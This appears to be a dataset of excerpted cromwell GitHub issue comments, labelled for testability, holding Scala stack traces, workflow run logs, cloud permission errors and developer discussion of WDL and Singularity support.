org.scalatest.SuperEngine.$anonfun$runTestsInBra",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4351#issuecomment-451186054:1306,Test,TestSuite,1306,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4351#issuecomment-451186054,1,['Test'],['TestSuite']
Testability," assertion failed: received unexpected message RealMessage(ServiceUnreachable,TestActor[akka://TestSystem-a47da50b-5587-413b-bbc6-4773a965cb41/user/$$i]) after 0 millis; at akka.testkit.TestKitBase.expectNoMsg_internal(TestKit.scala:696); at akka.testkit.TestKitBase.expectNoMessage(TestKit.scala:661); at akka.testkit.TestKitBase.expectNoMessage$(TestKit.scala:660); at akka.testkit.TestKit.expectNoMessage(TestKit.scala:896); at cromwell.core.actor.RobustClientHelperSpec.$anonfun$new$7(RobustClientHelperSpec.scala:140); at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); at org.scalatest.OutcomeOf.outcomeOf(OutcomeOf.scala:85); at org.scalatest.OutcomeOf.outcomeOf$(OutcomeOf.scala:83); at org.scalatest.OutcomeOf$.outcomeOf(OutcomeOf.scala:104); at org.scalatest.Transformer.apply(Transformer.scala:22); at org.scalatest.Transformer.apply(Transformer.scala:20); at org.scalatest.FlatSpecLike$$anon$1.apply(FlatSpecLike.scala:1682); at org.scalatest.TestSuite.withFixture(TestSuite.scala:196); at org.scalatest.TestSuite.withFixture$(TestSuite.scala:195); at cromwell.core.actor.RobustClientHelperSpec.withFixture(RobustClientHelperSpec.scala:14); at org.scalatest.FlatSpecLike.invokeWithFixture$1(FlatSpecLike.scala:1680); at org.scalatest.FlatSpecLike.$anonfun$runTest$1(FlatSpecLike.scala:1692); at org.scalatest.SuperEngine.runTestImpl(Engine.scala:289); at org.scalatest.FlatSpecLike.runTest(FlatSpecLike.scala:1692); at org.scalatest.FlatSpecLike.runTest$(FlatSpecLike.scala:1674); at cromwell.core.actor.RobustClientHelperSpec.runTest(RobustClientHelperSpec.scala:14); at org.scalatest.FlatSpecLike.$anonfun$runTests$1(FlatSpecLike.scala:1750); at org.scalatest.SuperEngine.$anonfun$runTestsInBranch$1(Engine.scala:396); at scala.collection.immutable.List.foreach(List.scala:389); at org.scalatest.SuperEngine.traverseSubNodes$1(Engine.scala:384); at org.scalatest.SuperEngine.runTestsInBranch(Engine.scala:373); at org.scalatest.SuperEngine.$anonfun$runTestsInBra",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4351#issuecomment-454822183:1043,Test,TestSuite,1043,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4351#issuecomment-454822183,1,['Test'],['TestSuite']
Testability," at https://gist.github.com/denis-yuen/b3aa8b0e882dee1fe8cb6cab82286e46. The error message is pretty similar, is it possible #4308 affects both scenarios?. Equivalent excerpts below:; ```; dyuen@odl-dyuen2:~/test$ git clone https://github.com/dockstore-testing/dockstore-workflow-md5sum-unified.git; Cloning into 'dockstore-workflow-md5sum-unified'...; remote: Enumerating objects: 113, done.; remote: Total 113 (delta 0), reused 0 (delta 0), pack-reused 113; Receiving objects: 100% (113/113), 24.79 KiB | 1.24 MiB/s, done.; Resolving deltas: 100% (50/50), done.; dyuen@odl-dyuen2:~/test$ cd dockstore-workflow-md5sum-unified; dyuen@odl-dyuen2:~/test/dockstore-workflow-md5sum-unified$ cwltool checker_workflow_wrapping_workflow.cwl md5sum.json; /usr/local/bin/cwltool 1.0.20180403145700; Resolved 'checker_workflow_wrapping_workflow.cwl' to 'file:///home/dyuen/test/dockstore-workflow-md5sum-unified/checker_workflow_wrapping_workflow.cwl'; <snip>; Final process status is success; dyuen@odl-dyuen2:~/test/dockstore-workflow-md5sum-unified$ wget https://github.com/broadinstitute/cromwell/releases/download/36/cromwell-36.jar; --2018-11-09 10:24:06-- https://github.com/broadinstitute/cromwell/releases/download/36/cromwell-36.jar; <snip>; 2018-11-09 10:24:25 (9.05 MB/s) - ‘cromwell-36.jar’ saved [175930401/175930401]. dyuen@odl-dyuen2:~/test/dockstore-workflow-md5sum-unified$ java -jar cromwell-36.jar run checker_workflow_wrapping_workflow.cwl --inputs md5sum.json; [2018-11-09 10:25:13,02] [info] Running with database db.url = jdbc:hsqldb:mem:563ca6aa-5d9b-4e8f-b0c6-f3901066317d;shutdown=false;hsqldb.tx=mvcc; [2018-11-09 10:25:18,31] [info] Running migration RenameWorkflowOptionsInMetadata with a read batch size of 100000 and a write batch size of 100000; [2018-11-09 10:25:18,32] [info] [RenameWorkflowOptionsInMetadata] 100%; [2018-11-09 10:25:18,39] [info] Running with database db.url = jdbc:hsqldb:mem:254e87aa-251d-4bd6-bc6f-663624317535;shutdown=false;hsqldb.tx=mvcc; <snip>; [201",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4366#issuecomment-437395477:1108,test,test,1108,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4366#issuecomment-437395477,1,['test'],['test']
Testability," backends, and workflows. The backends run the workflows, and cromwell is just a manager for that.; - **backend** is an API really for services. The basic needs for this API are generally ""start, ""stop"", ""status,"" etc., and other kinds of ""controller"" commands for a particular executable. You have to be able to list what is going on, and get PIDs, and issue stop and status commands for the guts inside.; - **executable** is a script, binary, etc. that the scientist has written all the magic into, that takes some input arguments (data, poutputs, thresholds, etc.) and ""does the scientific thing"" to return to the workflow manager (cromwell) that is controlling its run via the backend. ## What does Singularity + Cromwell look like?. People keep saying these two together, and I've been struggling to figure it out. I've been doing a lot of work trying to do that. What does it mean for Singularity to be a part of Cromwell. I first logically thought it would mean a backend, because the basic exec / run commands for Singularity don't change much (but arguments do!). But it doesn't fit well here because it's missing that API to make it a fully fledged service. To those familiar with Singularity, this is the instance command group (and not running containers as images). Then I thought it was really more of a workflow executable. But if this is the case, why is it special at all? It doesn't really fit because there is still going to be a lot of redundancy in specifying the ""singularity run <container> <args> bit over and over again. So I think (eventually) all these use cases could fit into cromwell,. - running a singularity container as an executable with a backend like slurm; - running a singularity container as an executable on with Local (host) backend; - running a container as a backend as a container instance (via its API). but for now, without a clean API for services, only the first two really make sense. Singularity is not special. It's just a binary. ## Why has it been",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-416418214:2056,log,logically,2056,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-416418214,2,['log'],['logically']
Testability," do_something() on an optional throws a ""Expected X but got X?"" error that doesn't tell you if X is actually defined or not. The fact that the WDL spec doesn't explicitly say that defined() can coerce a variable doesn't really matter -- I would wager that most people would expect this sort of thing to work. It seems to be a logical conclusion that if a file exists, you can do something to that file, without having to call a totally different function to create a new variable. I did check your workaround, but it throws the same error. So, my understanding is the only way to do this in Cromwell is this:. ```; String basename_tsv = basename(select_first([tsv_file_input, ""bogus fallback value""])); String arg_tsv = if(basename_tsv == ""bogus fallback value"") then """" else basename_tsv; ```. ...which just isn't intuitive. It shouldn't be so complicated to get the basename of an optional file. . Even less intuitive is the fact that if you separate out the select_first() part into a new variable, my workaround doesn't work anymore. ```; String maybe_tsv = select_first([tsv_file_input, ""bogus fallback value""]); String basename_tsv = basename(maybe_tsv); String arg_tsv = if(basename_tsv == ""bogus fallback value"") then """" else basename_tsv; ```. _Failed to process task definition 'parse_terratable' (reason 1 of 1): Failed to process expression 'select_first([basename_tsv, basename(maybe_tsv)])' (reason 1 of 1): Invalid parameter 'IdentifierLookup(maybe_tsv)'. Expected 'File' but got 'String?'_. In other words -- it is unnecessarily complicated to work with optionals, and the workarounds that do exist appear to be inconsistent. It seems this could all be sidestepped by having ""if X exists, do something to X"" logic. (I want to make clear I'm coming at this from a perspective of someone who uses WDL heavily, mostly in the context of Terra/Cromwell, and wants wider adoption. From my experience, oddities like this are serious obstacles for both newcomers and heavy users like myself.)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245893354:2640,log,logic,2640,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245893354,2,['log'],['logic']
Testability," environment and was able to copy files into the cromwell executions bucket. Though something weird seems to be going on with the authentication because the instance appears to have write permissions for all the s3 buckets in the region, which appears to be due to the AmazonEC2RoleforSSM policy attached to the instance IAM:. ```; {; ""Version"": ""2012-10-17"",; ""Statement"": [; {; ""Effect"": ""Allow"",; ""Action"": [; ""ssm:DescribeAssociation"",; ""ssm:GetDeployablePatchSnapshotForInstance"",; ""ssm:GetDocument"",; ""ssm:GetManifest"",; ""ssm:GetParameters"",; ""ssm:ListAssociations"",; ""ssm:ListInstanceAssociations"",; ""ssm:PutInventory"",; ""ssm:PutComplianceItems"",; ""ssm:PutConfigurePackageResult"",; ""ssm:UpdateAssociationStatus"",; ""ssm:UpdateInstanceAssociationStatus"",; ""ssm:UpdateInstanceInformation""; ],; ""Resource"": ""*""; },; {; ""Effect"": ""Allow"",; ""Action"": [; ""ssmmessages:CreateControlChannel"",; ""ssmmessages:CreateDataChannel"",; ""ssmmessages:OpenControlChannel"",; ""ssmmessages:OpenDataChannel""; ],; ""Resource"": ""*""; },; {; ""Effect"": ""Allow"",; ""Action"": [; ""ec2messages:AcknowledgeMessage"",; ""ec2messages:DeleteMessage"",; ""ec2messages:FailMessage"",; ""ec2messages:GetEndpoint"",; ""ec2messages:GetMessages"",; ""ec2messages:SendReply""; ],; ""Resource"": ""*""; },; {; ""Effect"": ""Allow"",; ""Action"": [; ""cloudwatch:PutMetricData""; ],; ""Resource"": ""*""; },; {; ""Effect"": ""Allow"",; ""Action"": [; ""ec2:DescribeInstanceStatus""; ],; ""Resource"": ""*""; },; {; ""Effect"": ""Allow"",; ""Action"": [; ""ds:CreateComputer"",; ""ds:DescribeDirectories""; ],; ""Resource"": ""*""; },; {; ""Effect"": ""Allow"",; ""Action"": [; ""logs:CreateLogGroup"",; ""logs:CreateLogStream"",; ""logs:DescribeLogGroups"",; ""logs:DescribeLogStreams"",; ""logs:PutLogEvents""; ],; ""Resource"": ""*""; },; {; ""Effect"": ""Allow"",; ""Action"": [; ""s3:GetBucketLocation"",; ""s3:PutObject"",; ""s3:GetObject"",; ""s3:GetEncryptionConfiguration"",; ""s3:AbortMultipartUpload"",; ""s3:ListMultipartUploadParts"",; ""s3:ListBucket"",; ""s3:ListBucketMultipartUploads""; ],; ""Resource"": ""*""; }; ]; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4341#issuecomment-435109292:1614,log,logs,1614,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4341#issuecomment-435109292,5,['log'],['logs']
Testability," failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:45:48 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:45:48 I: Copying /var/log/google-genomics/*.log to; gs://broad-dsde-methods/lichtens/cromwell-executions-test_dl_oxoq/bamsurgeon_workflow/f6f01c57-23e2-4d29-854a-0d39c11ff950/call-generate_true_positives/; 2017/02/07 15:45:48 I: Running command: sudo gsutil -h; Content-type:text/plain -q -m cp /var/log/google-genomics/*.log; gs://broad-dsde-methods/lichtens/cromwell-executions-test_dl_oxoq/bamsurgeon_workflow/f6f01c57-23e2-4d29-854a-0d39c11ff950/call-generate_true_positives/; 2017/02/07 15:46:18 I: Copying /var/log/google-genomics/*.log to; gs://broad-dsde-methods/lichtens/cromwell-executions-test_dl_oxoq/bamsurgeon_workflow/f6f01c57-23e2-4d29-854a-0d39c11ff950/call-generate_true_positives/; 2017/02/07 15:46:18 I: Running command: sudo gsutil -h; Content-type:text/plain -q -m cp /var/log/google-genomics/*.log; gs://broad-dsde-methods/lichtens/cromwell-executions-test_dl_oxoq/bamsurgeon_workflow/f6f01c57-23e2-4d29-854a-0d39c11ff950/call-generate_true_positives/. ```. On Tue, Feb 7, 2017 at 2:29 PM, Jeff Gentry <notifications@github.com>; wrote:. > @LeeTL1220 <https://github.com/LeeTL1220> Where do you see these being; > retried? i.e. can you paste in the evidence th",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:14584,log,log,14584,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,2,['log'],['log']
Testability," input_bundle_uuid = bundle_uuid,\n reference_bundle = reference_bundle,\n run_type = run_type,\n schema_version = schema_version,\n method = method,\n retry_seconds = retry_seconds,\n timeout_seconds = timeout_seconds,\n runtime_environment = runtime_environment\n }\n}\n"",; ""workflowType"": ""WDL"",; ""options"": ""{\n \""read_from_cache\"": false\n}"",; ""inputs"": ""{\""AdapterSs2RsemSingleSample.timeout_seconds\"":1.2E+2,\""AdapterSs2RsemSingleSample.reference_bundle\"":\""bf51d668-3e14-4843-9bc7-5d676fdf0e01\"",\""AdapterSs2RsemSingleSample.rrna_interval\"":\""gs://broad-dsde-mint-dev-teststorage/reference/Hg19_kco/hg19.rRNA.interval_list\"",\""AdapterSs2RsemSingleSample.rsem_genome\"":\""gs://broad-dsde-mint-dev-teststorage/reference/Hg19_kco/rsem_hg19_gencode_v19.tar.gz\"",\""AdapterSs2RsemSingleSample.runtime_environment\"":\""dev\"",\""AdapterSs2RsemSingleSample.ref_flat\"":\""gs://broad-dsde-mint-dev-teststorage/reference/Hg19_kco/refFlat.txt\"",\""AdapterSs2RsemSingleSample.format_map\"":\""gs://broad-dsde-mint-dev-teststorage/format_map_example.json\"",\""AdapterSs2RsemSingleSample.bundle_uuid\"":\""c59a5720-ca82-429d-9d5b-6116987e221d\"",\""AdapterSs2RsemSingleSample.ref_fasta\"":\""gs://broad-dsde-mint-dev-teststorage/reference/Hg19_kco/Hg19.fa\"",\""AdapterSs2RsemSingleSample.run_type\"":\""run\"",\""AdapterSs2RsemSingleSample.bundle_version\"":\""2017-09-20T211432.976293Z\"",\""AdapterSs2RsemSingleSample.gtf\"":\""gs://broad-dsde-mint-dev-teststorage/reference/Hg19_kco/Gencode_v19/Gencode_v19.GTF\"",\""AdapterSs2RsemSingleSample.retry_seconds\"":1E+1,\""AdapterSs2RsemSingleSample.method\"":\""Ss2RsemSingleSample\"",\""AdapterSs2RsemSingleSample.dss_url\"":\""https://dss.staging.data.humancellatlas.org/v1\"",\""AdapterSs2RsemSingleSample.submit_url\"":\""http://api.ingest.staging.data.humancellatlas.org/\"",\""AdapterSs2RsemSingleSample.star_genome\"":\""gs://broad-dsde-mint-dev-teststorage/reference/Hg19_kco/star_hg19_gencode_v19.tar.gz\"",\""AdapterSs2RsemSingleSample.schema_version\"":\""v3\""}"",; ""labels"": ""{}""; },; ""calls"": {",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3060#issuecomment-351777550:4543,test,teststorage,4543,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3060#issuecomment-351777550,1,['test'],['teststorage']
Testability," merged! We needed to have tests too, so I followed up on that:; - https://github.com/broadinstitute/cromwell/pull/4015 . But unfortunately it was decided that CircleCI was too new / needed to learn stuff (this is ok!) so it's going to be closed. . ## Question 2: How do we add a Singularity backend?. But this is actually ok, because we realize that we don't need to add Singularity to Cromwell proper, it can just be a backend! But I didn't understand wdl, or any of the formats, so my crew in Cherry lab gave me a solid repo to startwith, and then it started to click!; - https://github.com/vsoch/wgbs-pipeline/pull/1. I was waiting for the Dockerfile test PR to pass, but realized it probably wouldn't, so I jumped on adding the example backend workflows (still without totally understanding what/why/how, but figuring out as I went):; - https://github.com/broadinstitute/cromwell/pull/4039. ## Question 3: But what about Cromwell+Singularity on Travis?. I got confused again when there were [requests for additional tests](https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-416313519) (and something entirely different) that it made me step back. I had this growing feeling that started to solidify that there are too many layers. I am developing things and I **still** don't understand (or think Singularity is ready yet) to be any kind of backend. I'm forcing a dog into a cat shaped hole just because this is the hole I'm supposed to fill. Is that a good idea? I've lost sight of what the tool is trying to do. Cromwell is trying to make it easy to run a Singularity container. But if that's the case, then why has this command:. ```bash; singularity run shub://vsoch/hello-world; ```. turned into needing Cromwell (java and the jar), an inputs json file, a wdl specification, a backend configuration, and a runtime command that I can't seem to remember, and then the entire thing takes much longer than an instance to echo a tiny Rawwwwr! If this is the goal we are going for, ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-416418214:8995,test,tests,8995,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-416418214,2,['test'],['tests']
Testability," new graduate student knows how to develop a new tool because there are nicely defined rules. A good example is to look at the BIDS (brain imaging data structure) that (has several file formats under it) but it revolutionizing how brain imaging analysis is done. (e.g, take a look at [https://www.openneuro.org](https://www.openneuro.org). # Development of my Thinking; Finally, I want to share how I came to the thinking above. Here are the steps that I've taken in the last few weeks, and resulting thoughts from them. I started with this issue board actually, and a general goal to ""Add Singularity to Cromwell."" Ok. ### Question 1: How do I develop Cromwell?; It first was hard for me to know where to start to develop Cromwell, because the docs just went into how to compile it on a host. So it made sense to make it easy for the developer to develop Cromwell so I made a Dockerfile to do that:; - https://github.com/broadinstitute/cromwell/pull/4002. Woohoo merged! We needed to have tests too, so I followed up on that:; - https://github.com/broadinstitute/cromwell/pull/4015 . But unfortunately it was decided that CircleCI was too new / needed to learn stuff (this is ok!) so it's going to be closed. . ## Question 2: How do we add a Singularity backend?. But this is actually ok, because we realize that we don't need to add Singularity to Cromwell proper, it can just be a backend! But I didn't understand wdl, or any of the formats, so my crew in Cherry lab gave me a solid repo to startwith, and then it started to click!; - https://github.com/vsoch/wgbs-pipeline/pull/1. I was waiting for the Dockerfile test PR to pass, but realized it probably wouldn't, so I jumped on adding the example backend workflows (still without totally understanding what/why/how, but figuring out as I went):; - https://github.com/broadinstitute/cromwell/pull/4039. ## Question 3: But what about Cromwell+Singularity on Travis?. I got confused again when there were [requests for additional tests](https://gi",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-416418214:8001,test,tests,8001,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-416418214,2,['test'],['tests']
Testability," of caching and has to rerun. Is there; > any way to prevent the timeout of the actor?; >; > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded,; > multipart copies to improve the size of results that may be cached. There; > are also additional improvements that have recently been merged into dev; > and should appear in the next release version (or you could build from; > source) v52+ requires a new AWS configuration. Instructions are in; > https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > … <#m_3227077625045957240_>; > On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout; > exception during cache copying on AWS S3. The cache file size is 133GB.; > Given the file size, more time should be allowed for cache copying. Is; > there any config option that can tune this? Thank you in advance for any; > suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure; > copying cache results for job; > BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo; > FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out; > waiting for a response to copy s3://xxxxx/cromwell-execution/Germ; > line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136; > /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to; > s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488; > 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u; > nmerged.bam) — You are receiving this because you are subscribed to this; > thread. Reply to this email directly, view it on GitHub <#5977; > <https://github.com/broadinstitute/cromwell/issues/5977>>, or unsubscribe; > https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFS",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055:1923,log,log,1923,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055,1,['log'],['log']
Testability," on a host. So it made; > sense to make it easy for the developer to develop Cromwell so I made a; > Dockerfile to do that:; >; > - #4002 <https://github.com/broadinstitute/cromwell/pull/4002>; >; > Woohoo merged! We needed to have tests too, so I followed up on that:; >; > - #4015 <https://github.com/broadinstitute/cromwell/pull/4015>; >; > But unfortunately it was decided that CircleCI was too new / needed to; > learn stuff (this is ok!) so it's going to be closed.; > Question 2: How do we add a Singularity backend?; >; > But this is actually ok, because we realize that we don't need to add; > Singularity to Cromwell proper, it can just be a backend! But I didn't; > understand wdl, or any of the formats, so my crew in Cherry lab gave me a; > solid repo to startwith, and then it started to click!; >; > - vsoch/wgbs-pipeline#1 <https://github.com/vsoch/wgbs-pipeline/pull/1>; >; > I was waiting for the Dockerfile test PR to pass, but realized it probably; > wouldn't, so I jumped on adding the example backend workflows (still; > without totally understanding what/why/how, but figuring out as I went):; >; > - #4039 <https://github.com/broadinstitute/cromwell/pull/4039>; >; > Question 3: But what about Cromwell+Singularity on Travis?; >; > I got confused again when there were requests for additional tests; > <https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-416313519>; > (and something entirely different) that it made me step back. I had this; > growing feeling that started to solidify that there are too many layers. I; > am developing things and I *still* don't understand (or think Singularity; > is ready yet) to be any kind of backend. I'm forcing a dog into a cat; > shaped hole just because this is the hole I'm supposed to fill. Is that a; > good idea? I've lost sight of what the tool is trying to do. Cromwell is; > trying to make it easy to run a Singularity container. But if that's the; > case, then why has this command:; >; > singularity run shub:/",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-441126046:10970,test,test,10970,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-441126046,2,['test'],['test']
Testability, org.scalatest.FlatSpecLike.$anonfun$run$1(FlatSpecLike.scala:1795); at org.scalatest.SuperEngine.runImpl(Engine.scala:521); at org.scalatest.FlatSpecLike.run(FlatSpecLike.scala:1795); at org.scalatest.FlatSpecLike.run$(FlatSpecLike.scala:1793); at cromwell.core.actor.RobustClientHelperSpec.run(RobustClientHelperSpec.scala:14); at org.scalatest.tools.Framework.org$scalatest$tools$Framework$$runSuite(Framework.scala:314); at org.scalatest.tools.Framework$ScalaTestTask.execute(Framework.scala:507); at sbt.TestRunner.runTest$1(TestFramework.scala:113); at sbt.TestRunner.run(TestFramework.scala:124); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.$anonfun$apply$1(TestFramework.scala:282); at sbt.TestFramework$.sbt$TestFramework$$withContextLoader(TestFramework.scala:246); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.apply(TestFramework.scala:282); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.apply(TestFramework.scala:282); at sbt.TestFunction.apply(TestFramework.scala:294); at sbt.Tests$.processRunnable$1(Tests.scala:347); at sbt.Tests$.$anonfun$makeSerial$1(Tests.scala:353); at sbt.std.Transform$$anon$3.$anonfun$apply$2(System.scala:46); at sbt.std.Transform$$anon$4.work(System.scala:67); at sbt.Execute.$anonfun$submit$2(Execute.scala:269); at sbt.internal.util.ErrorHandling$.wideConvert(ErrorHandling.scala:16); at sbt.Execute.work(Execute.scala:278); at sbt.Execute.$anonfun$submit$1(Execute.scala:269); at sbt.ConcurrentRestrictions$$anon$4.$anonfun$submitValid$1(ConcurrentRestrictions.scala:178); at sbt.CompletionService$$anon$2.call(CompletionService.scala:37); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); at java.la,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4351#issuecomment-451186054:4327,Test,TestFramework,4327,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4351#issuecomment-451186054,2,['Test'],['TestFramework']
Testability, over 3.3447279390999998 minutes. Last failure message: Submitted did not equal Failed.; at org.scalatest.concurrent.Eventually.tryTryAgain$1(Eventually.scala:432); at org.scalatest.concurrent.Eventually.eventually(Eventually.scala:439); at org.scalatest.concurrent.Eventually.eventually$(Eventually.scala:391); at cromwell.CromwellTestKitSpec.eventually(CromwellTestKitSpec.scala:251); at cromwell.CromwellTestKitSpec.runWdl(CromwellTestKitSpec.scala:323); at cromwell.WorkflowFailSlowSpec.$anonfun$new$2(WorkflowFailSlowSpec.scala:18); at org.scalatest.OutcomeOf.outcomeOf(OutcomeOf.scala:85); at org.scalatest.OutcomeOf.outcomeOf$(OutcomeOf.scala:83); at org.scalatest.OutcomeOf$.outcomeOf(OutcomeOf.scala:104); at org.scalatest.Transformer.apply(Transformer.scala:22); at org.scalatest.Transformer.apply(Transformer.scala:20); at org.scalatest.WordSpecLike$$anon$1.apply(WordSpecLike.scala:1078); at org.scalatest.TestSuite.withFixture(TestSuite.scala:196); at org.scalatest.TestSuite.withFixture$(TestSuite.scala:195); at cromwell.CromwellTestKitWordSpec.withFixture(CromwellTestKitSpec.scala:250); at org.scalatest.WordSpecLike.invokeWithFixture$1(WordSpecLike.scala:1076); at org.scalatest.WordSpecLike.$anonfun$runTest$1(WordSpecLike.scala:1088); at org.scalatest.SuperEngine.runTestImpl(Engine.scala:289); at org.scalatest.WordSpecLike.runTest(WordSpecLike.scala:1088); at org.scalatest.WordSpecLike.runTest$(WordSpecLike.scala:1070); at cromwell.CromwellTestKitWordSpec.runTest(CromwellTestKitSpec.scala:250); at org.scalatest.WordSpecLike.$anonfun$runTests$1(WordSpecLike.scala:1147); at org.scalatest.SuperEngine.$anonfun$runTestsInBranch$1(Engine.scala:396); at scala.collection.immutable.List.foreach(List.scala:389); at org.scalatest.SuperEngine.traverseSubNodes$1(Engine.scala:384); at org.scalatest.SuperEngine.runTestsInBranch(Engine.scala:373); at org.scalatest.SuperEngine.$anonfun$runTestsInBranch$1(Engine.scala:410); at scala.collection.immutable.List.foreach(List.scala:389); a,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4521#issuecomment-453539593:1145,Test,TestSuite,1145,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4521#issuecomment-453539593,1,['Test'],['TestSuite']
Testability, over 3.3499629773500006 minutes. Last failure message: Submitted did not equal Failed.; at org.scalatest.concurrent.Eventually.tryTryAgain$1(Eventually.scala:432); at org.scalatest.concurrent.Eventually.eventually(Eventually.scala:439); at org.scalatest.concurrent.Eventually.eventually$(Eventually.scala:391); at cromwell.CromwellTestKitSpec.eventually(CromwellTestKitSpec.scala:251); at cromwell.CromwellTestKitSpec.runWdl(CromwellTestKitSpec.scala:323); at cromwell.WorkflowFailSlowSpec.$anonfun$new$4(WorkflowFailSlowSpec.scala:30); at org.scalatest.OutcomeOf.outcomeOf(OutcomeOf.scala:85); at org.scalatest.OutcomeOf.outcomeOf$(OutcomeOf.scala:83); at org.scalatest.OutcomeOf$.outcomeOf(OutcomeOf.scala:104); at org.scalatest.Transformer.apply(Transformer.scala:22); at org.scalatest.Transformer.apply(Transformer.scala:20); at org.scalatest.WordSpecLike$$anon$1.apply(WordSpecLike.scala:1078); at org.scalatest.TestSuite.withFixture(TestSuite.scala:196); at org.scalatest.TestSuite.withFixture$(TestSuite.scala:195); at cromwell.CromwellTestKitWordSpec.withFixture(CromwellTestKitSpec.scala:250); at org.scalatest.WordSpecLike.invokeWithFixture$1(WordSpecLike.scala:1076); at org.scalatest.WordSpecLike.$anonfun$runTest$1(WordSpecLike.scala:1088); at org.scalatest.SuperEngine.runTestImpl(Engine.scala:289); at org.scalatest.WordSpecLike.runTest(WordSpecLike.scala:1088); at org.scalatest.WordSpecLike.runTest$(WordSpecLike.scala:1070); at cromwell.CromwellTestKitWordSpec.runTest(CromwellTestKitSpec.scala:250); at org.scalatest.WordSpecLike.$anonfun$runTests$1(WordSpecLike.scala:1147); at org.scalatest.SuperEngine.$anonfun$runTestsInBranch$1(Engine.scala:396); at scala.collection.immutable.List.foreach(List.scala:389); at org.scalatest.SuperEngine.traverseSubNodes$1(Engine.scala:384); at org.scalatest.SuperEngine.runTestsInBranch(Engine.scala:373); at 